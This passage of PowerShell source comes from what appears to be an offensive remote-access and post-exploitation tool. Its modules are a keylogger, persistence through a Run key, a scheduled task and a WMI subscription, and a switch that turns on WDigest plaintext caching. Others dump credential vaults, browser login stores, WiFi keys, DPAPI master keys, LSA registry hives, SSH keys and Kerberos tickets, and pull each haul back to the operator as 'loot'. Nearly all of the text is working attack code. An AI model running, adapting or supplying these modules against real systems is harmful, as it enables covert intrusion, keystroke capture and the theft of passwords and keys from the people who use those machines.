            } -ArgumentList (Join-Path $remoteDirectory 'dllhost.exe'), $remoteHost)
            if (-not $script:ARModuleFiles.Contains($logPath)) { $script:ARModuleFiles.Add($logPath) }
        }
        if ([string]::IsNullOrWhiteSpace($logPath)) { throw 'The keylogger log path could not be resolved.' }
        Write-ARInfo ('Fast keylogger running - keystrokes mirror every 15 seconds into ' + $mirrorLog + '. Escape stops it.')
        $cursor = 0
        $stopped = $false
        while (-not $stopped) {
            $stopped = Wait-ARModuleSeconds -Seconds 15
            $bytes = $null
            try {
                if (Test-ARIsLocalTarget) {
                    if (Test-Path -LiteralPath $logPath) { $bytes = [System.IO.File]::ReadAllBytes($logPath) }
                }
                else {
                    Receive-ARFileFromTarget -RemotePath $logPath -LocalPath $pullFile | Out-Null
                    $bytes = [System.IO.File]::ReadAllBytes($pullFile)
                }
            }
            catch { }
            if ($bytes) {
                if ($bytes.Length -lt $cursor) { $cursor = 0 }
                if ($bytes.Length -gt $cursor) {
                    $fresh = [System.Text.Encoding]::UTF8.GetString($bytes, $cursor, ($bytes.Length - $cursor))
                    $cut = $fresh.LastIndexOf("`n")
                    if ($cut -ge 0) {
                        # Only complete lines advance the offset, so a stroke
                        # landing mid-line never splits across two prints.
                        $printable = $fresh.Substring(0, ($cut + 1))
                        $cursor += [System.Text.Encoding]::UTF8.GetByteCount($printable)
                        [System.IO.File]::AppendAllText($mirrorLog, $printable, [System.Text.Encoding]::UTF8)
                        foreach ($line in ($printable -split "`n")) {
                            $stroke = $line.Trim()
                            if ($stroke -ne '') { Write-Host ('  keys: ' + $stroke) -ForegroundColor Gray }
                        }
                    }
                }
            }
        }
    }
    finally {
        try {
            if (Test-ARIsLocalTarget) {
                Get-Process | Where-Object { $_.Path -eq $localHostExe -or $_.Path -like '*\AutoRDPwnKey_*\svchost.exe' } | Stop-Process -Force -ErrorAction SilentlyContinue
                if ($logPath -ne '') { Remove-Item -LiteralPath $logPath -Force -ErrorAction SilentlyContinue }
            }
            elseif ($remoteDirectory -ne '') {
                Invoke-ARTargetCommand -ScriptBlock {
                    param($hostProcess, $log, $directory)
                    Get-Process | Where-Object { $_.Path -eq $hostProcess -or $_.Path -like '*\AutoRDPwnKey_*\svchost.exe' } | Stop-Process -Force -ErrorAction SilentlyContinue
                    Remove-Item -LiteralPath $log -Force -ErrorAction SilentlyContinue
                    Remove-Item -LiteralPath $directory -Recurse -Force -ErrorAction SilentlyContinue
                } -ArgumentList $remoteHost, $logPath, $remoteDirectory | Out-Null
                [void]$script:ARRemoteTempDirs.Remove($remoteDirectory)
                [void]$script:ARModuleFiles.Remove($logPath)
            }
        }
        catch { }
    }
    Set-ARStatus ('Keylogger stopped - mirror log: ' + $mirrorLog) 'Ok'
}

function Invoke-ARModulePersistenceKit {
    param([switch]$Remove)

    $runKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'

    if ($Remove) {
        # The registry backup list is not cleared here: Remove-ARTargetArtifacts
        # replays it at session end, and replays on already-deleted names are
        # no-ops. A sweep picks up anything the ledger no longer knows about.
        $ledger = @()
        if (Get-Variable -Name ARPersistenceItems -Scope Script -ErrorAction SilentlyContinue) { $ledger = @($script:ARPersistenceItems.ToArray()) }
        $removed = Remove-ARPersistenceItems -Items $ledger -IncludeUnknown
        if (Get-Variable -Name ARPersistenceItems -Scope Script -ErrorAction SilentlyContinue) { $script:ARPersistenceItems.Clear() }
        if ($removed -gt 0) { Write-ARSuccess ('Persistence removed: ' + $removed + ' artifact(s)') }
        else { Write-ARInfo 'No AutoRDPwn persistence artifacts found.' }
        Set-ARStatus 'Persistence removal finished' 'Ok'
        return
    }

    # One heartbeat payload, three activation roads: HKCU run value, logon
    # task and WMI subscription. The payload writes one timestamp every 300 s
    # and exits after 288 iterations; no dial-back address, no listener, and
    # every name is random per run so removal stays unique to this session.
    $payloadScript = Join-Path 'C:\Windows\Temp' (New-ARRemoteTempName '.ps1')
    $heartbeatLog = Join-Path 'C:\Windows\Temp' (New-ARRemoteTempName '.log')
    $runName = 'ARDP_' + (New-ARModuleToken -Length 6)
    $taskName = 'AutoRDPwn' + (New-ARModuleToken -Length 6)
    $filterName = 'AutoRDPwnF' + (New-ARModuleToken -Length 6)
    $consumerName = 'AutoRDPwnC' + (New-ARModuleToken -Length 6)
    $commandLine = 'powershell.exe -nop -w hidden -ep bypass -f "' + $payloadScript + '"'
    $template = @'
$ErrorActionPreference = 'SilentlyContinue'
$log = '__LOGPATH__'
for ($i = 0; $i -lt 288; $i++) {
    try {
        [System.IO.File]::AppendAllText($log, ('[' + (Get-Date -Format 'yyyy-MM-dd HH:mm:ss') + '] AutoRDPwn heartbeat alive' + "`r`n"), [System.Text.Encoding]::UTF8)
    }
    catch { }
    Start-Sleep -Seconds 300
}
'@
    $work = New-ARWorkDirectory
    $localPayload = Join-Path $work 'heartbeat.ps1'
    [System.IO.File]::WriteAllText($localPayload, $template.Replace('__LOGPATH__', $heartbeatLog), [System.Text.Encoding]::UTF8)
    Copy-ARFileToTarget -LocalPath $localPayload -RemotePath $payloadScript | Out-Null
    if (-not $script:ARModuleFiles.Contains($payloadScript)) { $script:ARModuleFiles.Add($payloadScript) }
    if (-not $script:ARModuleFiles.Contains($heartbeatLog)) { $script:ARModuleFiles.Add($heartbeatLog) }

    $existingValue = $null
    $existedBackup = $false
    $oldValueText = ''
    $oldKind = 'String'
    try {
        $existingValue = Invoke-ARTargetCommand -ScriptBlock {
            param($key, $name)
            $registryItem = Get-Item -LiteralPath $key -ErrorAction SilentlyContinue
            if ($null -eq $registryItem) { return $null }
            $prior = $registryItem.GetValue($name)
            if ($null -eq $prior) { return $null }
            return @{ Value = [string]$prior; Kind = $registryItem.GetValueKind($name).ToString() }
        } -ArgumentList $runKey, $runName
    }
    catch { }
    if ($null -ne $existingValue) {
        $existedBackup = $true
        $oldValueText = [string]$existingValue.Value
        $oldKind = [string]$existingValue.Kind
    }
    # Recorded BEFORE the write, in the exact shape the session cleanup replays.
    $script:ARRegistryBackup.Add([pscustomobject]@{
        KeyPath = $runKey
        Name = $runName
        Existed = $existedBackup
        Value = $oldValueText
        Kind = $oldKind
    })
    try {
        Invoke-ARTargetCommand -ScriptBlock {
            param($key, $name, $command)
            New-ItemProperty -Path $key -Name $name -Value $command -PropertyType String -Force | Out-Null
        } -ArgumentList $runKey, $runName, $commandLine | Out-Null
        $script:ARPersistenceItems.Add([pscustomobject]@{ Kind = 'Run'; Name = $runName; Detail = ('script: ' + $payloadScript + '; log: ' + $heartbeatLog) })
        Write-ARSuccess ('Run value created: ' + $runName)
    }
    catch { Write-ARWarn ('Run value could not be created: ' + $_.Exception.Message) }

    $userTarget = [string]$script:ARTarget['User']
    try {
        Invoke-ARTargetCommand -ScriptBlock {
            param($name, $payloadPath, $userName)
            $userId = $userName
            if ($userId -and $userId -notmatch '\\') { $userId = $env:COMPUTERNAME + '\' + $userId }
            if ([string]::IsNullOrWhiteSpace($userId)) { $userId = $env:USERDOMAIN + '\' + $env:USERNAME }
            $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument ('-nop -w hidden -ep bypass -f "' + $payloadPath + '"')
            $principal = New-ScheduledTaskPrincipal -UserId $userId -LogonType Interactive -RunLevel Highest
            $trigger = New-ScheduledTaskTrigger -AtLogOn -User $userId
            Register-ScheduledTask -TaskName $name -Action $action -Principal $principal -Trigger $trigger -Force -ErrorAction Stop | Out-Null
        } -ArgumentList $taskName, $payloadScript, $userTarget | Out-Null
        $script:ARRemoteTasks.Add($taskName)
        $script:ARPersistenceItems.Add([pscustomobject]@{ Kind = 'Task'; Name = $taskName; Detail = ('script: ' + $payloadScript) })
        Write-ARSuccess ('Logon task created: ' + $taskName)
    }
    catch { Write-ARWarn ('Logon task could not be created: ' + $_.Exception.Message) }

    try {
        Invoke-ARTargetCommand -ScriptBlock {
            param($filter, $consumer, $command)
            $bootTrigger = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpDownStatus = 1"
            $filterObject = Set-WmiInstance -Namespace 'root\subscription' -Class '__EventFilter' -Arguments @{ Name = $filter; EventNamespace = 'root\cimv2'; QueryLanguage = 'WQL'; Query = $bootTrigger } -ErrorAction Stop
            $consumerObject = Set-WmiInstance -Namespace 'root\subscription' -Class 'CommandLineEventConsumer' -Arguments @{ Name = $consumer; CommandLineTemplate = $command } -ErrorAction Stop
            $null = Set-WmiInstance -Namespace 'root\subscription' -Class '__FilterToConsumerBinding' -Arguments @{ Filter = $filterObject; Consumer = $consumerObject } -ErrorAction Stop
        } -ArgumentList $filterName, $consumerName, $commandLine | Out-Null
        $script:ARPersistenceItems.Add([pscustomobject]@{ Kind = 'Wmi'; Name = $filterName; Detail = ('filter: ' + $filterName + '; consumer: ' + $consumerName + '; script: ' + $payloadScript) })
        Write-ARSuccess ('WMI subscription created: ' + $filterName + ' / ' + $consumerName)
    }
    catch { Write-ARWarn ('WMI subscription could not be created: ' + $_.Exception.Message) }

    Set-ARStatus 'Persistence kit installed' 'Ok'
}

function Invoke-ARAttackWdigest {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'WDigest credential caching'
    $session = Get-ARTargetSession
    $keyPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest'
    $result = Invoke-ARRemote -Session $session -ArgumentList $keyPath -ScriptBlock {
        param($path)
        $entry = [pscustomobject]@{
            KeyPath = $path
            Name    = 'UseLogonCredential'
            Existed = $false
            Value   = $null
            Kind    = 'DWord'
        }
        if (-not (Test-Path -LiteralPath $path)) { New-Item -Path $path -Force -ErrorAction Stop | Out-Null }
        try {
            $key = Get-Item -LiteralPath $path -ErrorAction Stop
            if (@($key.GetValueNames()) -contains 'UseLogonCredential') {
                $entry.Existed = $true
                $entry.Value = $key.GetValue('UseLogonCredential', $null, [Microsoft.Win32.RegistryValueOptions]::DoNotExpandEnvironmentNames)
                $entry.Kind = [string]$key.GetValueKind('UseLogonCredential')
            }
        }
        catch { }
        New-ItemProperty -Path $path -Name 'UseLogonCredential' -Value 1 -PropertyType DWord -Force -ErrorAction Stop | Out-Null
        $current = (Get-ItemProperty -Path $path -Name 'UseLogonCredential' -ErrorAction Stop).UseLogonCredential
        return [pscustomobject]@{ Previous = $entry; Current = [int]$current }
    }
    foreach ($entry in @($result.Previous)) {
        if (-not $entry) { continue }
        # Oldest snapshot wins: a second run must not record the value it just wrote.
        $known = $false
        foreach ($existing in $script:ARRegistryBackup) {
            if ($existing.KeyPath -eq $entry.KeyPath -and $existing.Name -eq $entry.Name) { $known = $true; break }
        }
        if (-not $known) { $script:ARRegistryBackup.Add($entry) }
    }
    $before = 'not set'
    if ($result.Previous.Existed) { $before = [string]$result.Previous.Value }
    Write-ARInfo ('WDigest UseLogonCredential: ' + $before + ' -> ' + [string]$result.Current)
    Write-ARSuccess 'WDigest plaintext caching enabled and registered for restore.'
    Write-ARWarn 'UseLogonCredential only covers logons made after the change; credentials cached earlier stay hashed until the next interactive logon.'
    Set-ARStatus 'WDigest plaintext caching enabled' 'Ok'
}

function Invoke-ARAttackVaultDump {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Credential vault dump'
    $session = Get-ARTargetSession
    $vaults = @('Windows Credentials', 'Web Credentials', 'Certificate Credentials')
    $lines = New-Object System.Collections.Generic.List[string]
    foreach ($vault in $vaults) {
        $result = Invoke-ARRemote -Session $session -ArgumentList $vault -ScriptBlock {
            param($name)
            try {
                $output = & vaultcmd.exe ('/listcreds:"' + $name + '"') /all 2>&1
                $code = $LASTEXITCODE
            }
            catch {
                $output = @($_.Exception.Message)
                $code = -1
            }
            return [pscustomobject]@{ ExitCode = $code; Text = (($output | Out-String).Trim()) }
        }
        $code = [int]$result.ExitCode
        $text = [string]$result.Text
        Write-ARInfo ('vaultcmd /listcreds:"' + $vault + '" /all -> exit ' + [string]$code)
        if ($code -ne 0 -and -not [string]::IsNullOrWhiteSpace($text)) { Write-ARWarn ('Vault ' + $vault + ': ' + $text) }
        $lines.Add('=== ' + $vault + ' (exit ' + [string]$code + ') ===')
        if ([string]::IsNullOrWhiteSpace($text)) { $lines.Add('(no entries)') }
        else {
            $lines.Add($text)
            Write-Host $text -ForegroundColor Gray
        }
    }
    $safeTarget = $target -replace '[\\/:*?"<>|]', '_'
    $localFile = Join-Path (Get-ARLootDirectory 'vault') ('vault-' + $safeTarget + '-' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.txt')
    [System.IO.File]::WriteAllText($localFile, ($lines -join "`r`n"), [System.Text.Encoding]::UTF8)
    Write-ARSuccess ('Vault report saved to ' + $localFile)
    Set-ARStatus 'Credential vault dumped' 'Ok'
}

function Invoke-ARAttackBrowserCredentials {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Browser credential collection'
    $session = Get-ARTargetSession
    $remoteDirectory = Join-Path 'C:\Windows\Temp' (New-ARRemoteTempName)
    $script:ARRemoteTempDirs.Add($remoteDirectory)
    $remoteZip = Join-Path $remoteDirectory 'browser-credentials.zip'
    $safeTarget = $target -replace '[\\/:*?"<>|]', '_'
    $localZip = Join-Path (Get-ARLootDirectory 'browser') ($safeTarget + '-browser-' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.zip')
    try {
        $summary = Invoke-ARRemote -Session $session -ArgumentList $remoteDirectory, $remoteZip -ScriptBlock {
            param($directory, $archive)
            if (-not (Test-Path -LiteralPath $directory)) { New-Item -ItemType Directory -Path $directory -Force | Out-Null }
            $staging = Join-Path $directory 'staging'
            New-Item -ItemType Directory -Path $staging -Force -ErrorAction Stop | Out-Null
            $roots = New-Object System.Collections.Generic.List[object]
            $usersRoot = Join-Path $env:SystemDrive 'Users'
            try {
                foreach ($userRoot in @(Get-ChildItem -LiteralPath $usersRoot -Directory -ErrorAction Stop)) {
                    $roots.Add([pscustomobject]@{ Browser = 'Chrome'; User = $userRoot.Name; Path = (Join-Path $userRoot.FullName 'AppData\Local\Google\Chrome\User Data') })
                    $roots.Add([pscustomobject]@{ Browser = 'Edge'; User = $userRoot.Name; Path = (Join-Path $userRoot.FullName 'AppData\Local\Microsoft\Edge\User Data') })
                }
            }
            catch { }
            $copied = New-Object System.Collections.Generic.List[string]
            foreach ($root in $roots) {
                if (-not (Test-Path -LiteralPath $root.Path)) { continue }
                $localState = Join-Path $root.Path 'Local State'
                if (Test-Path -LiteralPath $localState) {
                    $destination = Join-Path $staging ($root.Browser + '-' + $root.User + '-Local State')
                    Copy-Item -LiteralPath $localState -Destination $destination -Force -ErrorAction SilentlyContinue
                    if (Test-Path -LiteralPath $destination) { $copied.Add($destination) }
                }
                foreach ($profile in @(Get-ChildItem -LiteralPath $root.Path -Directory -ErrorAction SilentlyContinue)) {
                    $loginData = Join-Path $profile.FullName 'Login Data'
                    if (-not (Test-Path -LiteralPath $loginData)) { continue }
                    $destination = Join-Path $staging ($root.Browser + '-' + $root.User + '-' + $profile.Name + '-Login Data')
                    Copy-Item -LiteralPath $loginData -Destination $destination -Force -ErrorAction SilentlyContinue
                    if (Test-Path -LiteralPath $destination) { $copied.Add($destination) }
                    if ($copied.Count -ge 512) { break }
                }
                if ($copied.Count -ge 512) { break }
            }
            if ($copied.Count -eq 0) { return [pscustomobject]@{ FileCount = 0; Bytes = 0 } }
            Compress-Archive -Path (Join-Path $staging '*') -DestinationPath $archive -Force -ErrorAction Stop
            return [pscustomobject]@{ FileCount = $copied.Count; Bytes = [int64](Get-Item -LiteralPath $archive -ErrorAction Stop).Length }
        }
        if ([int]$summary.FileCount -eq 0) {
            Write-ARWarn 'No Chrome or Edge credential store was found in any user profile.'
            Set-ARStatus 'Browser credential collection: nothing found' 'Warn'
            return
        }
        Receive-ARFileFromTarget -RemotePath $remoteZip -LocalPath $localZip -Session $session | Out-Null
        $megabytes = [Math]::Round((Get-Item -LiteralPath $localZip -ErrorAction Stop).Length / 1MB, 2)
        Write-ARSuccess ('Loot saved to ' + $localZip + ' (' + [string]$summary.FileCount + ' files, ' + [string]$megabytes + ' MB)')
        Write-ARInfo 'Offline decryption needs the DPAPI master keys: per user %APPDATA%\Microsoft\Protect\<SID>\<GUID> and the machine keys (action 224 collects both). The Local State file holds the encrypted v80+ key.'
        Set-ARStatus 'Browser credentials collected' 'Ok'
    }
    finally {
        try {
            Invoke-ARRemote -Session $session -ArgumentList $remoteDirectory -ScriptBlock {
                param($path)
                Remove-Item -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue
            } | Out-Null
        }
        catch { }
    }
}

function Invoke-ARAttackWifiKeys {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'WiFi key recovery'
    $session = Get-ARTargetSession
    $result = Invoke-ARRemote -Session $session -ScriptBlock {
        $profiles = New-Object System.Collections.Generic.List[string]
        try {
            $listing = @(& netsh.exe wlan show profiles 2>&1 | ForEach-Object { [string]$_ })
        }
        catch { return ('netsh wlan show profiles failed: ' + $_.Exception.Message) }
        foreach ($line in $listing) {
            $separator = $line.LastIndexOf(':')
            if ($separator -lt 0) { continue }
            $name = $line.Substring($separator + 1).Trim()
            if ($name -eq '') { continue }
            if ($profiles.Contains($name)) { continue }
            $profiles.Add($name)
            if ($profiles.Count -ge 256) { break }
        }
        if ($profiles.Count -eq 0) { return 'No wireless profile is configured on the target.' }
        $lines = New-Object System.Collections.Generic.List[string]
        $lines.Add('=== netsh wlan show profiles ===')
        foreach ($line in $listing) { $lines.Add($line) }
        foreach ($name in @($profiles.ToArray())) {
            $lines.Add('')
            $lines.Add('=== ' + $name + ' ===')
            try {
                foreach ($line in @(& netsh.exe wlan show profile ('name="' + $name + '"') key=clear 2>&1 | ForEach-Object { [string]$_ })) { $lines.Add($line) }
            }
            catch { $lines.Add('netsh wlan show profile failed: ' + $_.Exception.Message) }
        }
        return ($lines -join "`r`n")
    }
    $text = [string]$result
    if (-not [string]::IsNullOrWhiteSpace($text)) { Write-Host $text -ForegroundColor Gray }
    $safeTarget = $target -replace '[\\/:*?"<>|]', '_'
    $localFile = Join-Path (Get-ARLootDirectory 'wifi') ('wifi-' + $safeTarget + '-' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.txt')
    [System.IO.File]::WriteAllText($localFile, $text, [System.Text.Encoding]::UTF8)
    Write-ARSuccess ('WiFi report saved to ' + $localFile)
    Set-ARStatus 'WiFi keys recovered' 'Ok'
}

function Invoke-ARAttackDpapiMasterKeys {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'DPAPI master key collection'
    $session = Get-ARTargetSession
    $remoteDirectory = Join-Path 'C:\Windows\Temp' (New-ARRemoteTempName)
    $script:ARRemoteTempDirs.Add($remoteDirectory)
    $remoteZip = Join-Path $remoteDirectory 'dpapi-master-keys.zip'
    $safeTarget = $target -replace '[\\/:*?"<>|]', '_'
    $localZip = Join-Path (Get-ARLootDirectory 'dpapi') ($safeTarget + '-dpapi-' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.zip')
    try {
        $summary = Invoke-ARRemote -Session $session -ArgumentList $remoteDirectory, $remoteZip -ScriptBlock {
            param($directory, $archive)
            if (-not (Test-Path -LiteralPath $directory)) { New-Item -ItemType Directory -Path $directory -Force | Out-Null }
            $staging = Join-Path $directory 'staging'
            New-Item -ItemType Directory -Path $staging -Force -ErrorAction Stop | Out-Null
            $copied = New-Object System.Collections.Generic.List[string]
            $usersRoot = Join-Path $env:SystemDrive 'Users'
            foreach ($userRoot in @(Get-ChildItem -LiteralPath $usersRoot -Directory -ErrorAction SilentlyContinue)) {
                $protect = Join-Path $userRoot.FullName 'AppData\Roaming\Microsoft\Protect'
                if (-not (Test-Path -LiteralPath $protect)) { continue }
                foreach ($sidDirectory in @(Get-ChildItem -LiteralPath $protect -Directory -ErrorAction SilentlyContinue)) {
                    foreach ($file in @(Get-ChildItem -LiteralPath $sidDirectory.FullName -File -ErrorAction SilentlyContinue)) {
                        $destination = Join-Path $staging ('user-' + $userRoot.Name + '-' + $sidDirectory.Name + '-' + $file.Name)
                        Copy-Item -LiteralPath $file.FullName -Destination $destination -Force -ErrorAction SilentlyContinue
                        if (Test-Path -LiteralPath $destination) { $copied.Add($destination) }
                        if ($copied.Count -ge 2048) { break }
                    }
                    if ($copied.Count -ge 2048) { break }
                }
                if ($copied.Count -ge 2048) { break }
            }
            $machineRoot = Join-Path $env:SystemRoot 'System32\Microsoft\Protect'
            if (Test-Path -LiteralPath $machineRoot) {
                foreach ($sidDirectory in @(Get-ChildItem -LiteralPath $machineRoot -Directory -ErrorAction SilentlyContinue)) {
                    foreach ($file in @(Get-ChildItem -LiteralPath $sidDirectory.FullName -File -ErrorAction SilentlyContinue)) {
                        $destination = Join-Path $staging ('machine-' + $sidDirectory.Name + '-' + $file.Name)
                        Copy-Item -LiteralPath $file.FullName -Destination $destination -Force -ErrorAction SilentlyContinue
                        if (Test-Path -LiteralPath $destination) { $copied.Add($destination) }
                        if ($copied.Count -ge 2048) { break }
                    }
                    if ($copied.Count -ge 2048) { break }
                }
            }
            if ($copied.Count -eq 0) { return [pscustomobject]@{ FileCount = 0; Bytes = 0 } }
            Compress-Archive -Path (Join-Path $staging '*') -DestinationPath $archive -Force -ErrorAction Stop
            return [pscustomobject]@{ FileCount = $copied.Count; Bytes = [int64](Get-Item -LiteralPath $archive -ErrorAction Stop).Length }
        }
        if ([int]$summary.FileCount -eq 0) {
            Write-ARWarn 'No DPAPI master key file could be read; other profiles need local admin or SYSTEM.'
            Set-ARStatus 'DPAPI master keys: nothing collected' 'Warn'
            return
        }
        Receive-ARFileFromTarget -RemotePath $remoteZip -LocalPath $localZip -Session $session | Out-Null
        Write-ARSuccess ('Loot saved to ' + $localZip + ' (' + [string]$summary.FileCount + ' key files)')
        Write-ARInfo 'Files are named user-<profile>-<SID>-<GUID> and machine-<SID>-<GUID>; decrypt with the matching user password or domain backup key.'
        Set-ARStatus 'DPAPI master keys collected' 'Ok'
    }
    finally {
        try {
            Invoke-ARRemote -Session $session -ArgumentList $remoteDirectory -ScriptBlock {
                param($path)
                Remove-Item -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue
            } | Out-Null
        }
        catch { }
    }
}

function Invoke-ARAttackLsaSecrets {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'LSA secrets dump'
    $session = Get-ARTargetSession
    $remoteDirectory = Join-Path 'C:\Windows\Temp' (New-ARRemoteTempName)
    $safeTarget = $target -replace '[\\/:*?"<>|]', '_'
    try {
        Invoke-ARRemote -Session $session -ArgumentList $remoteDirectory -ScriptBlock {
            param($path)
            if (-not (Test-Path -LiteralPath $path)) { New-Item -ItemType Directory -Path $path -Force | Out-Null }
        } | Out-Null
        $savedHives = New-Object System.Collections.Generic.List[string]
        foreach ($hive in @('SECURITY', 'SYSTEM')) {
            $result = Invoke-ARRemote -Session $session -ArgumentList $remoteDirectory, $hive -ScriptBlock {
                param($path, $name)
                $output = reg.exe save ('HKLM\' + $name) (Join-Path $path ($name + '.hiv')) /y 2>&1
                return [pscustomobject]@{ ExitCode = $LASTEXITCODE; Output = (($output | Out-String).Trim()) }
            }
            if ($result.ExitCode -ne 0) {
                Write-ARWarn ($hive + ' hive was not saved: ' + [string]$result.Output)
                continue
            }
            $savedHives.Add($hive)
        }
        if ($savedHives.Count -eq 0) { throw 'Neither the SECURITY nor the SYSTEM hive could be saved on the target.' }
        $localDirectory = Join-Path (Get-ARLootDirectory 'lsa') ($safeTarget + '-' + (Get-Date -Format 'yyyyMMdd-HHmmss'))
        foreach ($hive in @($savedHives.ToArray())) {
            $remoteFile = Join-Path $remoteDirectory ($hive + '.hiv')
            $localFile = Join-Path $localDirectory ($hive + '.hiv')
            Receive-ARFileFromTarget -RemotePath $remoteFile -LocalPath $localFile -Session $session | Out-Null
            Write-ARSuccess ($hive + ' hive saved to ' + $localFile)
        }
        Write-ARInfo 'Both hives belong together: secretsdump reads the LSA secrets from SECURITY with the boot key from SYSTEM, then the SAM hashes.'
        Set-ARStatus 'LSA secrets saved' 'Ok'
        return $localDirectory
    }
    finally {
        try {
            Invoke-ARRemote -Session $session -ArgumentList $remoteDirectory -ScriptBlock {
                param($path)
                Remove-Item -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue
            } | Out-Null
        }
        catch { }
    }
}

function Invoke-ARAttackSshKeys {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'SSH key collection'
    $session = Get-ARTargetSession
    $remoteDirectory = Join-Path 'C:\Windows\Temp' (New-ARRemoteTempName)
    $script:ARRemoteTempDirs.Add($remoteDirectory)
    $remoteZip = Join-Path $remoteDirectory 'ssh-keys.zip'
    $safeTarget = $target -replace '[\\/:*?"<>|]', '_'
    $localZip = Join-Path (Get-ARLootDirectory 'ssh') ($safeTarget + '-ssh-' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.zip')
    try {
        $summary = Invoke-ARRemote -Session $session -ArgumentList $remoteDirectory, $remoteZip -ScriptBlock {
            param($directory, $archive)
            if (-not (Test-Path -LiteralPath $directory)) { New-Item -ItemType Directory -Path $directory -Force | Out-Null }
            $staging = Join-Path $directory 'staging'
            New-Item -ItemType Directory -Path $staging -Force -ErrorAction Stop | Out-Null
            $copied = New-Object System.Collections.Generic.List[string]
            $usersRoot = Join-Path $env:SystemDrive 'Users'
            foreach ($userRoot in @(Get-ChildItem -LiteralPath $usersRoot -Directory -ErrorAction SilentlyContinue)) {
                $sshDirectory = Join-Path $userRoot.FullName '.ssh'
                if (Test-Path -LiteralPath $sshDirectory) {
                    foreach ($file in @(Get-ChildItem -LiteralPath $sshDirectory -File -ErrorAction SilentlyContinue)) {
                        $name = $file.Name
                        $wanted = $false
                        if ($name -like 'id_*') { $wanted = $true }
                        elseif ($name -like '*.pem') { $wanted = $true }
                        elseif ($name -eq 'known_hosts' -or $name -eq 'config') { $wanted = $true }
                        if (-not $wanted) { continue }
                        if ($file.Length -gt 1048576) { continue }
                        $destination = Join-Path $staging ($userRoot.Name + '-ssh-' + $file.Name)
                        Copy-Item -LiteralPath $file.FullName -Destination $destination -Force -ErrorAction SilentlyContinue
                        if (Test-Path -LiteralPath $destination) { $copied.Add($destination) }
                        if ($copied.Count -ge 512) { break }
                    }
                }
                if ($copied.Count -ge 512) { break }
                foreach ($file in @(Get-ChildItem -LiteralPath $userRoot.FullName -File -Filter '*.pem' -ErrorAction SilentlyContinue)) {
                    if ($file.Length -gt 1048576) { continue }
                    $destination = Join-Path $staging ($userRoot.Name + '-pem-' + $file.Name)
                    Copy-Item -LiteralPath $file.FullName -Destination $destination -Force -ErrorAction SilentlyContinue
                    if (Test-Path -LiteralPath $destination) { $copied.Add($destination) }
                    if ($copied.Count -ge 512) { break }
                }
                if ($copied.Count -ge 512) { break }
            }
            if ($copied.Count -eq 0) { return [pscustomobject]@{ FileCount = 0; Bytes = 0 } }
            Compress-Archive -Path (Join-Path $staging '*') -DestinationPath $archive -Force -ErrorAction Stop
            return [pscustomobject]@{ FileCount = $copied.Count; Bytes = [int64](Get-Item -LiteralPath $archive -ErrorAction Stop).Length }
        }
        if ([int]$summary.FileCount -eq 0) {
            Write-ARWarn 'No SSH material was found in any user profile.'
            Set-ARStatus 'SSH key collection: nothing found' 'Warn'
            return
        }
        Receive-ARFileFromTarget -RemotePath $remoteZip -LocalPath $localZip -Session $session | Out-Null
        Write-ARSuccess ('Loot saved to ' + $localZip + ' (' + [string]$summary.FileCount + ' files)')
        Write-ARInfo 'Originals were left untouched: only the staging copies were zipped, and the staging folder is removed on exit.'
        Set-ARStatus 'SSH keys collected' 'Ok'
    }
    finally {
        try {
            Invoke-ARRemote -Session $session -ArgumentList $remoteDirectory -ScriptBlock {
                param($path)
                Remove-Item -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue
            } | Out-Null
        }
        catch { }
    }
}

function Invoke-ARAttackKerberosTickets {
    param([string]$Session = '')

    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Kerberos ticket cache'
    $session = Get-ARTargetSession
    $safeTarget = $target -replace '[\\/:*?"<>|]', '_'
    $lootDirectory = Get-ARLootDirectory 'kerberos'
    $localFile = Join-Path $lootDirectory ('klist-' + $safeTarget + '-' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.txt')
    if ([string]::IsNullOrWhiteSpace($Session)) {
        $result = Invoke-ARRemote -Session $session -ScriptBlock {
            $lines = New-Object System.Collections.Generic.List[string]
            foreach ($extra in @(@(), @('-k'))) {
                $label = 'klist'
                if (@($extra).Count -gt 0) { $label = 'klist -k' }
                $lines.Add('=== ' + $label + ' ===')
                try {
                    $output = & klist.exe @extra 2>&1
                    $code = $LASTEXITCODE
                }
                catch {
                    $output = @($_.Exception.Message)
                    $code = -1
                }
                $lines.Add('(exit ' + [string]$code + ')')
                $lines.Add((($output | Out-String).Trim()))
            }
            return ($lines -join "`r`n")
        }
        [System.IO.File]::WriteAllText($localFile, [string]$result, [System.Text.Encoding]::UTF8)
        Write-ARSuccess ('Kerberos ticket cache of the remote account saved to ' + $localFile)
        Write-ARInfo 'Over WinRM this is the network logon cache, usually empty. Pass -Session <id> to read an interactive logon session instead.'
        Set-ARStatus 'Kerberos ticket cache dumped' 'Ok'
        return
    }
    if ($Session -notmatch '^\d+$') { throw 'Session must be a numeric session id.' }

    $remoteDirectory = Join-Path 'C:\Windows\Temp' (New-ARRemoteTempName)
    $script:ARRemoteTempDirs.Add($remoteDirectory)
    $remoteFile = Join-Path $remoteDirectory 'klist.txt'
